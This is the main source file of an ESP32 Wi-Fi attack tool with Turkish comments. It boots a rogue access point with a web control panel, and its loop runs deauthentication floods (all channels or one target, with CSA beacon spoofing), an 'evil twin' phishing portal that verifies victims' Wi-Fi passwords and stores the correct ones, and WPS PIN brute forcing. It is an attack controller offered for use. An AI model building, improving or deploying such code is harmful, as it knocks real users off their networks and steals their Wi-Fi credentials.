#include <WiFi.h>
#include <esp_wifi.h>
#include "types.h"
#include "web_interface.h"
#include "deauth.h"
#include "evil_twin.h"
#include "passwords.h"
#include "definitions.h"
#include "wps_attack.h"

int curr_channel = 1;

// Periyodik zamanlamalar
static unsigned long last_csa_send    = 0;
static unsigned long last_retrack     = 0;

// ─── Maks Performans Ayarları ─────────────────────────────────────────────────
static void apply_max_performance() {
  setCpuFrequencyMhz(160);
  esp_wifi_set_ps(WIFI_PS_NONE);
  esp_wifi_set_max_tx_power(84);
  esp_wifi_set_protocol(WIFI_IF_AP,
    WIFI_PROTOCOL_11B | WIFI_PROTOCOL_11G | WIFI_PROTOCOL_11N);
  DEBUG_PRINTLN("Maks performans: 160MHz, TX 20dBm, PS kapali");
}

static inline void reapply_wifi_power() {
  esp_wifi_set_max_tx_power(84);
  esp_wifi_set_ps(WIFI_PS_NONE);
}

void setup() {
#ifdef SERIAL_DEBUG
  Serial.begin(115200);
#endif
#ifdef LED
  pinMode(LED, OUTPUT);
#endif

  passwords_init();
  apply_max_performance();

  WiFi.mode(WIFI_MODE_AP);
  WiFi.softAP(AP_SSID, AP_PASS);

  start_web_interface();
  DEBUG_PRINTLN("Hazir. 192.168.4.1 adresine baglanin.");
}

void loop() {
  if (deauth_type == DEAUTH_TYPE_ALL) {
    // Tüm kanallara deauth — web sunucu duruyor, sadece kanal döngüsü
    if (curr_channel > CHANNEL_MAX) curr_channel = 1;
    esp_wifi_set_channel(curr_channel, WIFI_SECOND_CHAN_NONE);
    curr_channel++;
    delay(10);

  } else if (evil_twin_active) {
    // ── Evil Twin şifre testi (submit'ten sonra main loop devralır) ──────────
    if (et_test_pending && !et_result_ready) {
      et_result_correct = evil_twin_test_password(et_tested_password);
      et_result_ready   = true;
      et_test_pending   = false;
      reapply_wifi_power();
      if (et_result_correct) {
        passwords_save(et_tested_ssid, et_tested_password);
        stop_evil_twin();
        led_on();
      }
    }
    evil_twin_loop();
    web_interface_handle_client();

  } else if (wps_attack_state == WPS_ATTACKING) {
    // ── WPS PIN brute force — her iterasyon bir PIN denemesi ─────────────────
    wps_loop();                   // ~18s bloke eder; içinde handleClient() var
    web_interface_handle_client();// döngü arası ara istek karşıla

  } else {
    // Normal mod: deauth tek ağ veya bekleme
    web_interface_handle_client();

    unsigned long now = millis();

    if (deauth_type == DEAUTH_TYPE_SINGLE && deauth_target_ssid[0] != '\0') {
      if (now - last_csa_send >= CSA_INTERVAL_MS) {
        last_csa_send = now;
        send_csa_beacon();
      }
      if (now - last_retrack >= RETRACK_INTERVAL_MS) {
        last_retrack = now;
        retrack_deauth_target();
      }
    }
  }
}
